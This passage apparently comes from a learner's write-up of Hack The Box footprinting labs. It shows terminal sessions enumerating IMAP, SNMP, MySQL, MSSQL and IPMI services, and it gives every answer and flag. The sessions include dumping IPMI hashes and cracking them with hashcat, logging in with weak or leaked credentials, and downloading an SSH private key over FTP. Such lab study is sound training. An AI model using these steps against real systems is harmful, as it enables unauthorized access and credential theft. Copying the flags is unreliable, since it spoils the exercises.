    0010 - b1 17 86 4f 48 47 fe c4-a6 5d 44 57 f0 2d d1 57   ...OHG...]DW.-.W
    0020 - a6 8e f0 3a 05 00 9a 2b-2e 17 1f 1b 09 ce 7d 72   ...:...+......}r
    0030 - 54 d3 3e e4 be 2d 7b 3d-82 8a fd 12 39 16 05 bc   T.>..-{=....9...
    0040 - cc 5c a6 cc e0 3f a5 50-1c 5c 2c 44 85 39 01 23   .\...?.P.\,D.9.#
    0050 - 1d 01 b3 3d 1f b2 07 56-c3 68 3e 73 a9 29 20 97   ...=...V.h>s.) .
    0060 - 6a 0b 2d f4 5d 9a b4 03-12 02 ef aa bb 48 aa 78   j.-.]........H.x
    0070 - 92 8f 9f dc 83 1b 0a cb-3a f4 bc db 45 f3 0a 5e   ........:...E..^
    0080 - 04 52 57 25 88 a9 28 26-42 ff 5d 9c ae 38 bf 58   .RW%..(&B.]..8.X
    0090 - 09 02 0e f5 23 ac 69 98-3e ab f7 11 de e1 68 d2   ....#.i.>.....h.
    00a0 - 98 25 5f 2b 20 4e 3a 6b-d6 fe a1 c9 e7 20 dc 85   .%_+ N:k..... ..
    00b0 - 62 c5 66 16 85 19 10 09-b9 fd 55 b6 be 3e dd eb   b.f.......U..>..

    Start Time: 1674676477
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}

```

**Answer:** `HTB{roncfbw7iszerd7shni7jr2343zhrj}`

### Question 4:
![](./attachments/Pasted%20image%2020230125202053.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IMAP_POP3]
└─$ openssl s_client -connect 10.129.42.195:pop3s
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
   i:C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov  8 23:10:05 2021 GMT; NotAfter: Aug 23 23:10:05 2295 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEUzCCAzugAwIBAgIUDf35PqFuv6Uv0EECM8dFmNSZoY8wDQYJKoZIhvcNAQEL
BQAwgbcxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjEaMBgGA1UECgwRSW5sYW5lRnJlaWdodCBMdGQxHDAaBgNVBAsME0Rldk9w
cyBEZXDDg2FydG1lbnQxHjAcBgNVBAMMFWRldi5pbmxhbmVmcmVpZ2h0Lmh0YjEs
MCoGCSqGSIb3DQEJARYdY3RvLmRldkBkZXYuaW5sYW5lZnJlaWdodC5odGIwIBcN
MjExMTA4MjMxMDA1WhgPMjI5NTA4MjMyMzEwMDVaMIG3MQswCQYDVQQGEwJVSzEP
MA0GA1UECAwGTG9uZG9uMQ8wDQYDVQQHDAZMb25kb24xGjAYBgNVBAoMEUlubGFu
ZUZyZWlnaHQgTHRkMRwwGgYDVQQLDBNEZXZPcHMgRGVww4NhcnRtZW50MR4wHAYD
VQQDDBVkZXYuaW5sYW5lZnJlaWdodC5odGIxLDAqBgkqhkiG9w0BCQEWHWN0by5k
ZXZAZGV2LmlubGFuZWZyZWlnaHQuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEAxvMwFE6m+iBUSujb5d6DUy1xDYR5awzQRwddyvq6iBrMxbnptSrn
+j0UOKWHCOpD5LREwP26ghUg0lVJzfo+v5pQJGnxEXKg0OFlzWEd8xgx/JWW/z1/
rDsWlNa2yYZkCy68YWJlC7UZxvcDFrI0V0pDJIkrjForw26laoYDkrh1A5F8uUXD
1TwRLLYo+NGmtNHT3BADJpv6aFUZ4CGrqBQNi7XpsTZ948WLhUwQvWmebiK06Dai
TvMNKBctjWAiNI4xvq34W9hIUaPxT1JJzuujRslep6nHGHW00QEWTWgyOMYThc3b
HtKIHMfDLTUMz7s8RhVVwlWE6+ly1DMRgQIDAQABo1MwUTAdBgNVHQ4EFgQUGDTC
9B5KCKPWT7vXbnMunL/mEE4wHwYDVR0jBBgwFoAUGDTC9B5KCKPWT7vXbnMunL/m
EE4wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEADh0v5XWCf3KO
atrWcoiIOC67Z0ZIO7yEF+fQo8z+Wx1dWzmCFVu7u4+l7slcdJICCGBbOX8eItWS
chwzgnWJToyX8PWY8lSaB8ifMDQcr457Y7O6NmvgU35sRcLnYYqXzu2oh0lxsFLR
vL1wpyDLPhhoI++j1fELhiJ3GWiUQrb0vfJPcbSkHTgzf0hm7mLJTaqt3WfS/Gr2
8Oh7vSfzvqvHLE7HHAO0G5Q81zo+wWsrQF0s40HEF/raEMfOy2Htm79YjyjAlLWf
ueS+u8rX2smOYdRIpL3UPx7+yZPGu47vYoetde1Z5cfTCgmeS05BQ2qMOp6Tw6+G
xUuqg8nK1Q==
-----END CERTIFICATE-----
subject=C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
issuer=C = UK, ST = London, L = London, O = InlaneFreight Ltd, OU = DevOps Dep\C3\83artment, CN = dev.inlanefreight.htb, emailAddress = cto.dev@dev.inlanefreight.htb
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1667 bytes and written 503 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 28559CD7CE159AE83BCF7131E3F42DB978235B04063140B81F1B19056F2D6AC0
    Session-ID-ctx: 
    Resumption PSK: 4F2783FB488813C718C92703706A96B9EE0E51F69743A998AA24249DC109690B2980C38E46459D7598DA0A097AB71CAD
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a2 db 65 8f 38 51 40 8e-fd 0a 18 86 b9 37 b9 a2   ..e.8Q@......7..
    0010 - a9 ae 71 60 cc c7 95 d4-8a af c9 95 1f 40 b2 8c   ..q`.........@..
    0020 - dd 03 c9 4e 67 eb e0 16-54 c8 c3 01 b5 4a 3a bc   ...Ng...T....J:.
    0030 - d5 8b f8 64 43 c6 c3 12-f3 1a 35 95 ee 2c e7 3f   ...dC.....5..,.?
    0040 - be af 11 0f 05 2c fc 24-a2 7c fd 91 57 8b 40 a7   .....,.$.|..W.@.
    0050 - c1 04 f0 e3 44 87 a5 f0-65 8e c4 f0 05 ff 5b 00   ....D...e.....[.
    0060 - 03 12 37 98 3c a8 5b 17-12 e4 29 f0 4e f5 f6 3c   ..7.<.[...).N..<
    0070 - 69 48 3d 19 ba e2 29 be-e7 3d f6 52 c0 ca d0 ee   iH=...)..=.R....
    0080 - a0 11 3d c4 dd 7e ed 7f-2f af 45 62 6f ab 8c 9b   ..=..~../.Ebo...
    0090 - 02 8b 76 77 a2 f9 62 ba-7b 50 e9 cf de 9d 72 cd   ..vw..b.{P....r.
    00a0 - ab 14 89 80 ea 1a ab 67-0e 35 e5 92 39 b2 41 5b   .......g.5..9.A[
    00b0 - fe 13 bf fe 5c 0a 84 cd-c5 ea 7c 38 d6 5a da 50   ....\.....|8.Z.P

    Start Time: 1674676667
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: BE72C61D3FCCCC0439BB8E68590E49B936FE92AF8CF888F0F7B4D9A69153F586
    Session-ID-ctx: 
    Resumption PSK: 55BAE12E652466E44958FEF9D5F3E18601F5EBE4C18169F47091DFB937B675E6C706F3D5F4FED1327C888E14F860F41D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a2 db 65 8f 38 51 40 8e-fd 0a 18 86 b9 37 b9 a2   ..e.8Q@......7..
    0010 - 72 27 13 9d 1e 0d bb 7a-f6 e0 dd 37 fc 2c 23 0a   r'.....z...7.,#.
    0020 - 43 41 e2 2b bd ea 21 9c-eb ca c5 a0 d3 e5 95 fe   CA.+..!.........
    0030 - d1 dc e7 45 59 55 9e 45-96 8a 36 f3 99 e5 db 7d   ...EYU.E..6....}
    0040 - 07 e6 04 d5 80 f8 14 84-f9 68 ea 0f ec 18 85 ac   .........h......
    0050 - ea 2b e7 82 04 72 ae 51-a8 54 e8 1f 33 db b1 64   .+...r.Q.T..3..d
    0060 - 9b d0 11 dc f3 dd 6b ea-b3 b1 36 d2 1f fd 14 ec   ......k...6.....
    0070 - 80 3d b9 c2 2a 67 a3 48-5c c9 67 c3 2d 8c 41 9e   .=..*g.H\.g.-.A.
    0080 - 43 93 c3 32 5d b1 ec 87-16 2c 79 5e 13 cf 06 14   C..2]....,y^....
    0090 - 23 5b f5 2c 17 43 2e 2d-e8 40 9c 9a 5e 1c f5 ac   #[.,.C.-.@..^...
    00a0 - 1d 01 58 bc ea d8 90 ef-ad 86 ac 4e 4d f8 15 49   ..X........NM..I
    00b0 - b1 8b 11 98 36 15 47 da-a3 38 87 44 bf 4d a0 6f   ....6.G..8.D.M.o

    Start Time: 1674676667
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
+OK InFreight POP3 v9.188
```

**Answer:** `InFreight POP3 v9.188`

### Question 5:
![](./attachments/Pasted%20image%2020230125202107.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IMAP_POP3]
└─$ openssl s_client -connect 10.129.42.195:imaps
(...)
1 login robin robin  
1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
1 list "" *
* LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." INBOX
1 OK List completed (0.001 + 0.000 secs).
1 SELECT "DEV.DEPARTMENT.INT"
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414279] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.047 + 0.000 + 0.046 secs).
1 fetch 1:* all
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "08-Nov-2021 23:51:24 +0000" RFC822.SIZE 167 ENVELOPE ("Wed, 03 Nov 2021 16:13:27 +0200" "Flag" (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("CTO" NIL "devadmin" "inlanefreight.htb")) (("Robin" NIL "robin" "inlanefreight.htb")) NIL NIL NIL NIL))
1 OK Fetch completed (0.003 + 0.000 + 0.002 secs).

```

**Answer:** `devadmin@inlanefreight.htb`

### Question 6:
![](./attachments/Pasted%20image%2020230125202114.png)

```
(...)
1 fetch 1 RFC822
* 1 FETCH (RFC822 {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
1 OK Fetch completed (0.001 + 0.000 secs).
```

**Answer:** `HTB{983uzn8jmfgpd8jmof8c34n7zio}`

---
## SNMP
### Question 1:
![](./attachments/Pasted%20image%2020230126104803.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/SNMP2]
└─$ snmpwalk -v2c -c public 10.129.42.195
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIX02 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (335656) 0:55:56.56
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
(...)
```

**Answer:** `devadmin@inlanefreight.htb`

### Question 2:
![](./attachments/Pasted%20image%2020230126104831.png)

```
(...)
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
(...)
```

**Answer:** `InFreight SNMP v0.91`

### Question 3:
![](./attachments/Pasted%20image%2020230126104838.png)

```
iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71 = STRING: "/usr/share/flag.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.4.70.76.65.71 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.4.4.70.76.65.71 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.4.70.76.65.71 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.4.70.76.65.71 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.4.70.76.65.71 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
```

**Answer:** `HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}`

---
## MySQL
### Question 1:
![](./attachments/Pasted%20image%2020230126111714.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/MySQL]
└─$ sudo nmap -n -sV -sC --script mysql* -p3306 -oA nmap_sV_sC_3306_scan 10.129.205.5
Nmap scan report for 10.129.205.5
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsTransactions, LongPassword, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, ODBCClient, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, SwitchToSSLAfterHandshake, LongColumnFlag, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: V\x04Aag\x06?2\x0D~n6\x10RzI\x1CS\x179
|_  Auth Plugin Name: caching_sha2_password
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 42989 guesses in 603 seconds, average tps: 67.3
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 613.59 seconds
```

**Answer:** `MySQL 8.0.27`

### Question 2:
![](./attachments/Pasted%20image%2020230126111721.png)

```
┌──(kali㉿kali)-[~]
└─$ mysql -u robin -probin -h 10.129.205.5 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 377
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| customers          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.055 sec)

MySQL [customers]> show tables;
+---------------------+
| Tables_in_customers |
+---------------------+
| myTable             |
+---------------------+
1 row in set (0.035 sec)

MySQL [customers]> show columns from myTable;
+-----------+--------------------+------+-----+---------+----------------+
| Field     | Type               | Null | Key | Default | Extra          |
+-----------+--------------------+------+-----+---------+----------------+
| id        | mediumint unsigned | NO   | PRI | NULL    | auto_increment |
| name      | varchar(255)       | YES  |     | NULL    |                |
| email     | varchar(255)       | YES  |     | NULL    |                |
| country   | varchar(100)       | YES  |     | NULL    |                |
| postalZip | varchar(20)        | YES  |     | NULL    |                |
| city      | varchar(255)       | YES  |     | NULL    |                |
| address   | varchar(255)       | YES  |     | NULL    |                |
| pan       | varchar(255)       | YES  |     | NULL    |                |
| cvv       | varchar(255)       | YES  |     | NULL    |                |
+-----------+--------------------+------+-----+---------+----------------+
9 rows in set (0.063 sec)

MySQL [customers]> select * from myTable where name = "Otto Lang";
+----+-----------+---------------------+---------+-----------+---------+-----------------+------------------+------+
| id | name      | email               | country | postalZip | city    | address         | pan              | cvv  |
+----+-----------+---------------------+---------+-----------+---------+-----------------+------------------+------+
| 88 | Otto Lang | ultrices@google.htb | France  | 76733-267 | Belfast | 4708 Auctor Rd. | 5322224628183391 | 595  |
+----+-----------+---------------------+---------+-----------+---------+-----------------+------------------+------+
1 row in set (0.034 sec)

```

**Answer:** `ultrices@google.htb`

---
## MSSQL
### Question 1:
![](./attachments/Pasted%20image%2020230126112001.png)

```
msf6 > search mssql_ping

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  auxiliary/scanner/mssql/mssql_ping                   normal  No     MSSQL Ping Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_ping                                                                                                        

msf6 > use 0
msf6 auxiliary(scanner/mssql/mssql_ping) > options

Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/met
                                                   asploit-framework/wiki/Using-Metasploit
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option
                                                   set)

msf6 auxiliary(scanner/mssql/mssql_ping) > set rhost 10.129.201.248
rhost => 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = ILF-SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\ILF-SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Answer:** `ILF-SQL-01`

### Question 2:
![](./attachments/Pasted%20image%2020230126112008.png)
*Hint: Try to use some common passwords with the backdoor user account.*

```
┌──(kali㉿kali)-[~/HTB/Footprinting/MSSQL]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.201.248 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ILF-SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(ILF-SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> show databases
[-] ERROR(ILF-SQL-01): Line 1: Could not find stored procedure 'show'.
SQL> databases
[-] ERROR(ILF-SQL-01): Line 1: Could not find stored procedure 'databases'.
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> ! ls
nmap_sV_sC_1433_scan.gnmap  nmap_sV_sC_1433_scan.nmap  nmap_sV_sC_1433_scan.xml
SQL> ls
[-] ERROR(ILF-SQL-01): Line 1: Could not find stored procedure 'ls'.
SQL> select name from sys.databases
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

Employees
```

**Answer:** `Employees`

---
## IPMI
### Question 1:
![](./attachments/Pasted%20image%2020230126124022.png)

Nmap:

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IPMI]
└─$ sudo nmap -n -sU --script ipmi-version -p623 -oA nmap_sU_623_scan 10.129.202.5     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 06:44 EST
Nmap scan report for 10.129.202.5
Host is up (0.068s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

MSF:

```
msf6 > search ipmp_dump
[-] No results from search
msf6 > search ipmi_dump

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_dumphashes  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ipmi/ipmi_dumphashes                                                                                            

msf6 > use 0
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting          Required  Description
   ----                  ---------------          --------  -----------
   CRACK_COMMON          true                     yes       Automatically crack common passwords as
                                                            they are obtained
   OUTPUT_HASHCAT_FILE                            no        Save captured password hashes in hashcat
                                                             format
   OUTPUT_JOHN_FILE                               no        Save captured password hashes in john th
                                                            e ripper format
   PASS_FILE             /usr/share/metasploit-f  yes       File containing common passwords for off
                         ramework/data/wordlists            line cracking, one per line
                         /ipmi_passwords.txt
   RHOSTS                                         yes       The target host(s), see https://github.c
                                                            om/rapid7/metasploit-framework/wiki/Usin
                                                            g-Metasploit
   RPORT                 623                      yes       The target port
   SESSION_MAX_ATTEMPTS  5                        yes       Maximum number of session retries, requi
                                                            red on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                        yes       Delay between session retries in seconds
   THREADS               1                        yes       The number of concurrent threads (max on
                                                            e per host)
   USER_FILE             /usr/share/metasploit-f  yes       File containing usernames, one per line
                         ramework/data/wordlists
                         /ipmi_users.txt

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhost 10.129.202.5
rhost => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.202.5:623 - IPMI - Hash found: admin:209ca8b882000000d07e7f8e6724043e88d9b807569b5183c14bedf4a9636789607546691c7bcbf2a123456789abcdefa123456789abcdef140561646d696e:23c5468b83ebaca35cde3839b4e987179d00d3bf
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Answer:** `ADMIN`

### Question 2:
![](./attachments/Pasted%20image%2020230126124028.png)

```
┌──(kali㉿kali)-[~/HTB/Footprinting/IPMI]
└─$ hashcat ipmi.txt /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 9 3900X 12-Core Processor, 2921/5907 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Failed to parse hashes using the 'native hashcat' format.
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

209ca8b882000000d07e7f8e6724043e88d9b807569b5183c14bedf4a9636789607546691c7bcbf2a123456789abcdefa123456789abcdef140561646d696e:23c5468b83ebaca35cde3839b4e987179d00d3bf:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 209ca8b882000000d07e7f8e6724043e88d9b807569b5183c14...00d3bf
Time.Started.....: Thu Jan 26 12:59:06 2023 (0 secs)
Time.Estimated...: Thu Jan 26 12:59:06 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    38087 H/s (1.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 25%

Started: Thu Jan 26 12:58:52 2023
Stopped: Thu Jan 26 12:59:07 2023
```

**Answer:** `trinity`

---
## Footprinting Lab - Easy
### Question:
![](./attachments/Pasted%20image%2020230126175118.png)
*Hint: Our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. Remember that SSH keys need to have specific permissions set before they can be used.*

```
┌──(kali㉿kali)-[~/HTB/Footprinting/Easy]
└─$ ftp 10.129.152.232 -p 2121
Connected to 10.129.152.232.
220 ProFTPD Server (Ceil's FTP) [10.129.152.232]
Name (10.129.152.232:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||20266|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4.0k Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4.0k Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3.7k Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4.0k Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4.0k Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||46859|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |*********************************************************|  3381       30.44 KiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (16.84 KiB/s)
```

